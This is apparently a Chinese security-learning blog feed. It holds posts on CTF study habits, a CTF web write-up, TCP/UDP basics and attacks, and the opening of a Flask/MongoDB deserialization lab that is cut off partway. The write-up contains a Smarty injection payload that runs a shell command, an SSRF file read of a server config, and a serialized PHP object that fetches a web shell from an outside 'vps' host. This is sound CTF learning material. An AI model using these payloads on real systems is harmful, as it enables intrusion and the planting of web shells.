        <content type="html"><![CDATA[<p>开始新一轮的 CTF 学习，从其他地方学到很多的思想，顺便总结在第一篇文章中吧。</p><hr><h1 id="1-广度？"><a href="#1-广度？" class="headerlink" title="1 广度？"></a>1 广度？</h1><p>前段时间常常只关注单一的漏洞。具体的做法就是，先了解一种漏洞，然后去网上寻找这种漏洞的小分类，最后按照某些比较详细的 blog 进行练习。</p><blockquote><p>按照这样的步骤，一种漏洞就需要练习几周甚至几个月。</p></blockquote><p>我最近在极客时间的《10x程序员工作法》中，了解到了思维框架：</p><ol><li>以终为始（以）</li><li>任务分解</li><li>沟通交流</li><li>自动化</li></ol><p>用这种思想去思考我前面的做法，我得到的结论是：</p><blockquote><p>我的行为只能看见树木，不能看见森林。</p><p>在安全中有很多相似的漏洞，相似的手法。比如 SQL 注入和 XSS 漏洞的本质就是类似的，都是由于将用户的输入当成代码执行。</p><p>我如果以一种整体的视角来进行学习，进行分类和对比，那我就能迅速识别这些关键点，从而举一反三。</p></blockquote><p>（简而言之：不能学得太深入）</p><hr><h1 id="2-深度？"><a href="#2-深度？" class="headerlink" title="2 深度？"></a>2 深度？</h1><p>当然在我脑中还有另一个词在反驳，那就是竞争力的关键在于“一专多能”。“多能”是建立在“一专”基础上的。</p><h1 id="3-全都要"><a href="#3-全都要" class="headerlink" title="3 全都要"></a>3 全都要</h1><p>我认为主要在于专的「方向」。需要辨别你目前的方向是牛角尖，还是对社会有价值的。</p><p>我将 1.1 所提到的两种学习方式列在下面：</p><ol><li>把别人的 blog 再复现一遍。</li><li>将不同漏洞进行分类和对比，探索内部的联系。</li></ol><p>第 1 种方式并不是没有价值，而是处于一种为了学而学，是一种在高中或初中形成的思维定势（将一类题做懂就能得分）。在高中，做题时没有手机和电脑，知识点都是那几本书上的。现在我们身处大学，我们面对的问题更加的复杂、更加的多样化。想简单的利用刷题，太难了也没必要（价值不高）。</p><blockquote><p>总结：<br>我对于学习 CTF 的看法：</p><ol><li>要有目的性。（不想进 Defcon 的 CTFer 不是好 CTFer）根据目的来思考自己应该做什么。</li><li>平时多提问。通过提问将困难的问题逐步分解。</li><li>过于深入的问题，可以暂时不用研究，除非有需要（CTF 比赛碰见、工作需要、挖洞需要）</li></ol></blockquote><hr><h1 id="4-CTF之我见"><a href="#4-CTF之我见" class="headerlink" title="4 CTF之我见"></a>4 CTF之我见</h1><p>需要提出一些好的问题，才能更好的发展自己的 CTF 技能。（自学</p><p>比较好的一些问题：</p><ol><li>别人是怎么测试出那个漏洞的？</li><li>我怎么没测出来？</li><li>哪些技能还不够？（这时候就可以稍微再深入一点）</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF系列】2021年2月四叶草CTF</title>
      <link href="4df6a2708f77/"/>
      <url>4df6a2708f77/</url>
      
        <content type="html"><![CDATA[<p>四叶草网络安全学院的一次推广活动吧，正好可以试试自己的水平（问就是菜。</p><hr><h1 id="1-Web"><a href="#1-Web" class="headerlink" title="1 Web"></a>1 Web</h1><h2 id="1-1-题目：GET"><a href="#1-1-题目：GET" class="headerlink" title="1.1 题目：GET"></a>1.1 题目：GET</h2><blockquote><p>题目描述：Hello GET_flAG!!!</p><p>题目地址：<a href="http://0bc68a13.yunyansec.com/">http://0bc68a13.yunyansec.com/</a></p></blockquote><ol><li>根据提示输入任意的Get参数，即可查看源码。<a href="http://0bc68a13.yunyansec.com/?1">http://0bc68a13.yunyansec.com/?1</a></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line">$smarty = <span class="keyword">new</span> Smarty();</span><br><span class="line"><span class="keyword">if</span>($_GET)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span> $key.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/i&quot;</span>, $value))&#123;</span><br><span class="line">            </span><br><span class="line">            $smarty-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|exec|eval|cat|assert|file|fgets/i&quot;</span>, $value))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            $smarty-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);            </span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            $smarty-&gt;display(<span class="string">&quot;eval:&quot;</span>.$value);<span class="comment">//flag.php</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $smarty-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><ol start="2"><li>查询到smarty是模版注入的漏洞，访问验证漏洞<blockquote><p><a href="http://d40c2bf8.yunyansec.com/?a=%7Bphpinfo()%7D">http://d40c2bf8.yunyansec.com/?a={phpinfo()}</a></p></blockquote></li><li>利用寻找可利用的命令执行函数来查看 flag<blockquote><p><a href="http://938e2c8c.yunyansec.com/?a=%7Bpassthru(%22tac%20%60find%20-iname%20fla*%60%22)%7D">http://938e2c8c.yunyansec.com/?a={passthru(%22tac%20`find%20-iname%20fla*`%22)}</a></p></blockquote></li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/92EB4BEA-EA62-4D89-8826-961DF3247500.png"><br>（图片说明：passthru 函数会执行后面的命令<code>tac `find -iname fla*` </code>，这个命令用来寻找 flag 文件并且输出其内容）</p><h2 id="1-2-题目：Website"><a href="#1-2-题目：Website" class="headerlink" title="1.2 题目：Website"></a>1.2 题目：Website</h2><blockquote><p>题目描述：Website</p><p>附件下载：暂无附件</p><p>题目地址：<a href="http://eb9a2ac6.yunyansec.com/">http://eb9a2ac6.yunyansec.com/</a></p></blockquote><ol><li>猜测为 SSRF，有 WAF，可以使用 302 跳转绕过（可以使用 PHP 实现 302 跳转，使用 nginx 设置太麻烦了）</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/50B55344-016F-4009-BB4B-BC63ABC10B7F.png"></p><ol start="2"><li>使用 File 协议读取配置文件 /etc/httpd/conf/httpd.conf，发现 web 路径（Web1 和 Web2），可以进一步读取网站源码。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> <span class="attr">_default_:80</span>&gt;</span></span><br><span class="line">DocumentRoot /var/www/html/web1</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:8080</span>&gt;</span></span><br><span class="line">    DocumentRoot /var/www/html/web2</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>php反序列化拿shell，<a href="http://180fe897.yunyansec.com/?url=http://127.0.0.1:8080?data=payload">http://180fe897.yunyansec.com/?url=http://127.0.0.1:8080?data=payload</a> 在 1.txt 中写入 Web Shell。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">copy_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $path = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">&quot;e.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $url=<span class="string">&#x27;http://127.0.0.1:80/?url=http://vps/1.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(urlencode(serialize(<span class="keyword">new</span> copy_file())));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>访问 Web Shell，并找 flag。</li></ol><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/34E3850B-0AB5-43F7-BA48-4FED7BA9CE1B.png"></p><hr><h1 id="2-小结"><a href="#2-小结" class="headerlink" title="2 小结"></a>2 小结</h1><p>元宵节前一天的比赛，TimeLineSec 队里的师傅们把题目 AK 了🥳，Cool。</p><p>我第一道题是自己完整做出来的，第二道题和队里的师傅稍微讨论了一下，就接近 2 道题的样子。</p><p>打 CTF 有半年左右了，但这半年都只是在关注漏洞本身，属于一种只见树木不见森林的状态，希望后面能慢慢的再提升一些核心的技能点。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网传输神器Snapdrop（电脑、手机均可）</title>
      <link href="55416b06e2d8/"/>
      <url>55416b06e2d8/</url>
      
        <content type="html"><![CDATA[<p>Snapdrop 是一个跨端的传输工具，可以在 Window、Mac、Android、IOS 使用，甚至是任何设备——只要浏览器支持 WebRTC。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210226132700.png"></p><hr><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">为什么要使用这个工具？</font></p><p>以下是自己遇到的痛点：</p><p>我目前是 iPhone + Mac，使用 Airdrop 在自己的电脑和手机之间传输文件非常方便。但，在某次上课时，我由于某些原因没有录屏，于是让同学将文件发送到我的手机上。</p><p>最先想到的是 QQ 的面对面传输，但是！但是！但是！junk!</p><p>连接成功，但是传输失败，几次都是这样。我们不得不采用在线传输的方式。最后的结果：</p><ol><li>传输速度很慢</li><li>画质垃圾</li></ol><h1 id="2-How？"><a href="#2-How？" class="headerlink" title="2 How？"></a>2 How？</h1><p><font color="red">如何使用这个网站？</font></p><p>手机和电脑（或者是其他手机）连接上同一个 WIFI，让电脑和手机处于同一个局域网。</p><p>然后手机和电脑同时打开这个网站。这时就能发现，在网站的中心部分有新设备。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210226133902.png"><br>（图片说明：中间的 IOS 就是我的手机）</p><p>在电脑上左击设备可以发送文件，右击设备可以发送消息。</p><p>enjoy it!😋</p>]]></content>
      
      
      <categories>
          
          <category> 高效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件传输 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础1：TCP和UDP的区别是什么？</title>
      <link href="9aad0866ce62/"/>
      <url>9aad0866ce62/</url>
      
        <content type="html"><![CDATA[<p>TCP 是互联网的核心协议之一，也是面试常被提及的一个基本概念，所以我将它的相关问题整理在下面。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210226090052.png"></p><hr><p>我最近特别喜欢用发问的方式来解决问题，通过不断的发问和分解问题，能让一个复杂的问题变得简单，能让我的思路变得清晰明了。</p><p>针对这个面试题所提出的问题：</p><ol><li>面试官为什么要问这个问题？这个题目大概在考察什么？</li><li>这个问题的答案是什么？</li><li>相关的题目还有什么？</li></ol><hr><h1 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h1><p>考察应聘者对于计算机网络的网络体系结构的了解。在考察 TCP/IP 五层模型中的传输层的 TCP 和 UDP 传输协议。</p><p>既然提到 TCP/IP 五层模型，我发现用「送家具」来表示TCP/IP五层模型，是一个不错的场景，在这里总结一下吧。</p><p>先假设一个场景，有一位王先生刚刚在郊区买了新房，家里还是空空的，去到市区里购置了很多件家具（床、沙发、凳子），然后就回到家中等候即可。下面就是购买后的运输过程：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/882F9A27-D64F-496A-BDDD-03F60B20B06B.png"><br>（图片说明：图中的家具指代网络中的数据包，数据报从左向右发送）</p><ul><li>物理层：公路</li><li>数据链路层：装货的工人（体力劳动）</li><li>网络层：配送人员（司机）</li><li>传输层：拆卸/装配人员</li><li>应用层：买卖家具的人。</li></ul><p>比较常见的互联网体系模型有 OSI 参考模型和 TCP/IP 四层模型，每一层结构都有许多协议，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1384FD8C-985E-4405-A4FF-E4989DB86E2D.png"></p><p>在互联网中的信息传递，就类似现实中的物品传输，不过这两种传输的细腻度不同。现实生活中，如果物品很小，就不需要进行拆卸，这样就会简化很多流程。在互联网中，数据只能以 0 和 1 来表示，所以每个数据包都相当于现实生活中的大物品，需要拆分和处理之后才能进行运输。</p><hr><h1 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h1><p>要熟悉 TCP 和 UDP 的区别，需要先了解下面的内容：</p><ol><li>TCP 协议和 UDP 协议的概念是什么？</li><li>TCP 协议和 UDP 协议的基本内容有哪些？</li><li>他们的用途有何不同？这些用途是由于哪些基本内容导致的？</li><li>相关的网络攻击有哪些？怎么进行防御？</li></ol><p><font color="red">问2.1：TCP协议和UDP协议的概念是什么？</font></p><p>TCP 是传输控制协议（Transmission Control Protocol）的缩写。传输控制协议的定位是：面向连接的、可靠的、面向字节流的传输层通信协议。<br>（面向字节流的含义：最小发送单元由 TCP 确定，数据报只是一段无意义的字节流。如果数据报过大，会被切分成较小的单元进行发送）</p><p>UDP 是用户数据报协议（User Datagram Protocol）的缩写。用户数据报协议的定位是：简单的面向数据报的通信协议。<br>（面向数据报的含义：最小发送单元为数据报，应用程序交给 UDP 多大的数据报，UDP 就转发多大的数据报，不会理会数据报的大小）</p><p><font color="red">问2.2：TCP 协议和 UDP 协议的基本内容有哪些？</font></p><blockquote><p>从程序实现的角度来观察TCP和UDP的不同点。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/7A805CAE-DF4D-4DD0-B26B-991F0446982B.png"><br>（图片说明：左侧是 TCP 服务端和客户端的数据传输过程，右侧是 UDP 服务端和客户端的数据传输过程）</p></blockquote><p>从图中就能看出来他们最大的区别，TCP 面向连接，UDP 面向无连接。</p><ul><li>面向连接：类似两个人打电话。如果对方没有说话，让对方说话确认，以免尴尬。</li><li>面向无连接：类似快递服务。用户把信函放在邮件中期待邮政处理流程来传递邮政包裹</li></ul><p>TCP 的面向连接和面向字节流从而又产生了其他的特性。TCP的连接都需要经过确认，具有一定的可靠性。面向字节流意味着机器需要做更多的运算，降低了传输过程的效率，不太适用于大量的数据传输（视频传输）。</p><p>TCP针对自身的缺点（传输效率低），做了两种优化。</p><ul><li>流量控制：优化处理数据包的过程（发送前）。</li><li>阻塞控制：尽量避免数据包在线路中拥塞（发送中）。</li></ul><p>经过上面的分析可以制作出下面的对照表：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/906A7D16-202D-4F89-A2FD-718E3798E3A6.png"></p><p><font color="red">问2.3：他们的用途有何不同？这些用途是由于哪些基本内容导致的？</font></p><p>TCP 和 UDP 属于网络模型中的一个层次。应用层在传输不同类型的数据的时候，在传输层可以采用不同类型的传输层协议。其中 TCP/IP 的结构被广泛使用，但是 TCP 并不适用于所有应用。某些应用传输的数据允许有一定的失真率（视频、音频），如果依旧采用 TCP 会造成网络传输缓慢。</p><p>任何不是很需要可靠性或者是想将功能减到最少的应用可以避免使用 TCP。在很多情况下，当只需要多路复用应用服务时，用户数据报协议（UDP）可以代替 TCP 为应用提供服务。</p><p>总结：TCP 和 UDP 的使用需要根据具体的使用场景来分析，再确定选用哪一种类型的协议。它们的用途取决于它们传输效率。</p><blockquote><p>传输过程来观察 TCP 和 UDP 的不同点。</p></blockquote><p><font color="red">问2.4：相关的网络攻击有哪些？怎么进行防御？</font></p><p>握手中的攻击手段：</p><ol><li>Land 攻击：Dos 攻击中的一种。通过构造特殊的 TCP 包，来让服务器于自己建立连接，从而耗尽资源。</li><li>SYN洪水（SYN Flooding）：DDoS 攻击中的一种，耗尽服务器资源类的 DDoS 攻击，针对 TCP。攻击者向服务器发送大量的 SYN 报文请求，当服务器回应 SYN+ACK 报文时，不再继续回应 ACK 报文，导致服务器上建立大量的半连接，直至老化。这样，服务器的资源会被这些半连接耗尽，导致正常的请求无法回应。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210227145546.png"></li><li>UDP洪水（UDP Flood）：DDoS 攻击中的一种，耗尽带宽类的 DDoS 攻击（UDP 的特性）。防火墙防御UDP Flood攻击主要有两种方式：限流和指纹学习，两种方式各有利弊。限流方式属于暴力型，可以很快将UDP流量限制在一个合理的范围内，但是不分青红皂白，超过就丢，可能会丢弃一些正常报文；而指纹学习属于理智型，不会随意丢弃报文，但是发生攻击后需要有个指纹学习的过程。<img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210227150154.png"></li><li>RST 攻击（Rest the connection）：针对 TCP 的攻击。A 和服务器 B 之间建立了 TCP 连接，此时 C 伪造了一个 TCP 包发给 B，使 B 异常的断开了与 A 之间的 TCP 连接，就是 RST 攻击。在 2021 StarCTF 中，oh-my-socket 就需要利用 RST 攻击实现，<a href="https://github.com/sixstars/starctf2021/blob/main/web-oh-my-socket/oh-my-socket-ZH.md">传送门</a>。防御方式很简单，使用防火墙将进来的包带 RST 位的包丢弃就可以了。</li></ol><p>TCP 攻击大部分都是参考强叔的教程，写得很通俗易懂，感兴趣的可以去看看，<a href="https://www.google.com/search?q=%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF%E8%BF%9E%E8%BD%BD+site:forum.huawei.com&rlz=1C5CHFA_enHK918HK918&sxsrf=ALeKk00pL-KTThk9bgPjJYhWmWzY76LE_g:1614407846539&sa=X&ved=2ahUKEwi8odzxuYnvAhVQ7WEKHUroAmQQrQIoBHoECAEQBQ&biw=1745&bih=860">传送门</a></p><h1 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h1><p><font color="red">1. TCP三次握手原理是什么？为什么是三次握手而不是两次握手？</font></p><blockquote><p>来源：Gcow 面试题、<a href="https://whale3070.github.io/interview/2020/05/19/11-x/">https://whale3070.github.io/interview/2020/05/19/11-x/</a></p></blockquote><p>这里需要先了解 TCP 连接的建立过程。简而言之，三次握手四次挥手。</p><p><strong>连接建立：三次握手</strong>。首先明确三次握手的目的，三次握手的目的在于让通信双方都确定准备完成（发送功能正常，接受功能正常）。</p><ul><li>第一次握手：客户端发送含 SYN 信号的包，指明客户端想要连接服务器的端口。<ul><li>客户端角度：客户端发送功能正常。</li><li>服务器角度：客户端发送功能正常，服务器接收功能正常。</li></ul></li><li>第二次握手：服务器发回确认包(ACK)应答。<ul><li>客户端角度：客户端发送功能正常、接收功能正常。服务器发送功能正常，服务器接收功能正常。</li><li>服务器角度：客户端发送功能正常。服务器发送功能正常，服务器接收功能正常。</li></ul></li><li>第三次握手：客户端再次发送确认包(ACK)。<ul><li>客户端角度：客户端发送功能正常、接收功能正常。服务器发送功能正常，服务器接收功能正常。</li><li>服务器角度：客户端发送功能正常、接收功能正常。服务器发送功能正常，服务器接收功能正常。</li></ul></li></ul><p>如果只是两次握手， 至多只有连接发起方的起始序列号能被确认， 另一方选择的序列号则得不到确认。也就是服务器无法判断客户端是否能正常收到消息。</p><p> <font color="red">2. 举例一些常见的协议以及对应的端口</font></p><blockquote><p>来源：<a href="https://whale3070.github.io/experience/2019/10/11/05-x/">https://whale3070.github.io/experience/2019/10/11/05-x/</a></p></blockquote><ul><li>22 端口：SSH 远程连接</li><li>23 端口：Telnet 远程连接</li><li>53 端口：DNS 域名系统</li><li>67 端口：DHCP 服务</li><li>1433 端口：MSSQL 数据库</li><li>1521 端口：Oracle 数据库</li><li>3306 端口：MySQL 数据库</li><li>5900 端口：VNC 远程控制工具</li></ul><p> <font color="red">3. TCP/IP协议有哪 4 层？</font></p><blockquote><p>来源：<a href="https://whale3070.github.io/experience/2019/10/11/05-x/">https://whale3070.github.io/experience/2019/10/11/05-x/</a></p></blockquote><ul><li>应用层</li><li>传输层</li><li>网络层</li><li>数据链路层</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> udp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Windows中的存储长度命名是什么的缩写？</title>
      <link href="d43c52ab99ce/"/>
      <url>d43c52ab99ce/</url>
      
        <content type="html"><![CDATA[<p>Windows存储长度缩写解释：</p><ul><li>BIT（位）：是计算机最小的存储单位。以0或1来表示比特位的值。</li><li>BYTE（字节）：BYTE（1个字节，8位）。计量存储容量的一种计量单位，一个byte由8个bit组成，通常byte被用来代表一个英文字母、一个数字或一个符号。</li><li>WORD（字）：WORD（1个字，即2个字节，16位）通常由2个byte组成，一个word代表一个中文字，一个字的字长为16。</li><li>DWORD：Double Word（2个字，即2*2=4个字节，32位），每个word为2个字节的长度，是指计算机中数值的位数。</li><li>FWORD：其中F指代32位远指针（32-bit far pointer）的 far（3个字，即3*2=6字节，48位）。远指针是由4 个字节构成。它可以指向内存中的任一目标，可以用于任一编译模式，尽管仅在紧凑、大和巨模式下远指针才是缺省的数据指针（摘自百度百科）。</li><li>QWORD：Quad Word（4个字，即2*4=8个字节，64位）。Q是词根Quad的首字母，含义是4，同词根的quarter。</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/36f9078065e1a9eee3d7516ae941d1c1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用CRLF控制FTP攻击内网的mongodb来复现Flask反序列化漏洞</title>
      <link href="e312f4147bd5/"/>
      <url>e312f4147bd5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>最近在尝试做 starCTF 中的 oh-my-bet，需要使用 CRLF 漏洞来控制 FTP 向 mongodb 中发送数据包来修改 mongodb 中的内容。我尝试着自己手动构建了一个简易的环境来实现大致的流程。</p><h1 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2 环境搭建"></a>2 环境搭建</h1><p>使用虚拟机 + 主机两台机器来实现整个流程：</p><ol><li>宿主机（Web 服务器）</li><li>虚拟机（用来攻击的服务器）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E090DD65-02E1-4C35-8F3A-F29C686981D8.png"></li></ol><h2 id="2-1-搭建mongo环境（宿主机和虚拟机）"><a href="#2-1-搭建mongo环境（宿主机和虚拟机）" class="headerlink" title="2.1 搭建mongo环境（宿主机和虚拟机）"></a>2.1 搭建mongo环境（宿主机和虚拟机）</h2><p>在宿主机和虚拟机都需要搭建mongo环境，为了不与主机的 mongo 重合，我采用 27018 端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name mongo -p 27018:27017 mongo</span><br></pre></td></tr></table></figure><h2 id="2-2-flask（宿主机）"><a href="#2-2-flask（宿主机）" class="headerlink" title="2.2 flask（宿主机）"></a>2.2 flask（宿主机）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;f4545478ee86$%^&amp;&amp;%$#&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="string">&#x27;mongodb&#x27;</span>  <span class="comment"># session 类型为 mongodb</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_MONGODB&#x27;</span>] = pymongo.MongoClient(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">27018</span>)</span><br><span class="line">app.config[<span class="string">&#x27;SESSION_MONGODB_DB&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_MONGODB_COLLECT&#x27;</span>] = <span class="string">&#x27;sessions&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果设置为True，则关闭浏览器session就失效。</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_PERMANENT&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"><span class="comment"># 是否对发送到浏览器上session的cookie值进行加密</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_USE_SIGNER&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 保存到session中的值的前缀</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_KEY_PREFIX&#x27;</span>] = <span class="string">&#x27;session:&#x27;</span></span><br><span class="line"></span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;slug01sh&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello mongo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/get&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    b = session.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>这个 flask 应用共有 2 个路径 <code>/</code> 和 <code>/get</code></p><ul><li><code>/</code> 可以初始化 session</li><li><code>/get</code>可以将 session 从 mongo 中取出（会进行反序列化操作）</li></ul><p>访问 <a href="http://127.0.0.1:5000/">http://127.0.0.1:5000</a> ，查看控制台即可得到 session 为：922b2d8f-26c8-4146-8742-9d62b3988a17</p><h2 id="2-3-mongo数据包-虚拟机"><a href="#2-3-mongo数据包-虚拟机" class="headerlink" title="2.3 mongo数据包(虚拟机)"></a>2.3 mongo数据包(虚拟机)</h2><p>在虚拟机中生成 mongo 数据包，将二进制文件保存到 FTPD 的根目录下。（在这里，我缩略了一些步骤。oh-my-bet 一题中需要先把文件上传到 FTP 服务器中，并保存成文件，再发送到 mongo 中。而这里我直接生成数据包保存到 FTP 